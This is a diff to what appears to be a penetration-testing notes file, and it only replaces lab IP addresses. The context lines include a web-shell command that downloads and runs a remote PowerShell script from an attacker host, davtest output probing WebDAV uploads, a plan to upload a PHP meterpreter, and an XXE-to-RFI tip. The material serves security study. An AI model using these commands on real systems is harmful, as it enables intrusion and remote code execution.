@@ -1436,7 +1436,7 @@ The below system is running x64, Windows Server 2008 R2 with no Hotfixes install
                                   Connection Name: Local Area Connection
                                   DHCP Enabled:    No
                                   IP address(es)
-                                  [01]: 10.10.10.9
+                                  [01]: 10.54.98.9
 
 
 If there are no Hotfixes installed, we can visit 
@@ -1470,7 +1470,7 @@ The above can be executed by
 
 ::
 
- view-source:10.10.10.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
+ view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
 
  We execute powershell with noprofile and accept the input from stdin
 
@@ -3468,50 +3468,50 @@ Others
 
  ::
 
-  davtest -url http://10.10.10.15/
+  davtest -url http://10.54.98.15/
   ********************************************************
    Testing DAV connection
-  OPEN		SUCCEED:		http://10.10.10.15
+  OPEN		SUCCEED:		http://10.54.98.15
   ********************************************************
   NOTE	Random string for this session: E3u9ISnNswYes0
   ********************************************************
    Creating directory
-  MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
+  MKCOL		SUCCEED:		Created http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
   ********************************************************
    Sending test files
-  PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT	pl	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
   PUT	asp	FAIL
   PUT	aspx	FAIL
   PUT	cgi	FAIL
-  PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
-  PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
-  PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT	cfm	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT	jhtml	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
   PUT	shtml	FAIL
-  PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
-  PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
-  PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  PUT	php	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT	jsp	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
   ********************************************************
    Checking for test file execution
   EXEC	pl	FAIL
-  EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  EXEC	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
   EXEC	cfm	FAIL
   EXEC	jhtml	FAIL
   EXEC	php	FAIL
   EXEC	jsp	FAIL
-  EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  EXEC	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
   
   ********************************************************
   /usr/bin/davtest Summary:
-  Created: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
-  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
-  Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
-  Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  Created: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
  
  Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a php meterpreter in a text file and then MOVE the .txt file to .php and execute the php file.
 
@@ -3552,7 +3552,7 @@ Others
 
    echo "`ps aux --sort -rss`"
 
-* If there's a XXE on a website and possible RFI using internal address i.e on http://127.0.0.1:80/home=RFI rather than http://10.10.10.10:80/home=RFI, utilize XXE to send the request with localaddress.
+* If there's a XXE on a website and possible RFI using internal address i.e on http://127.0.0.1:80/home=RFI rather than http://10.54.98.10:80/home=RFI, utilize XXE to send the request with localaddress.
 
 * If there's a possible command execution on a website such as 
 
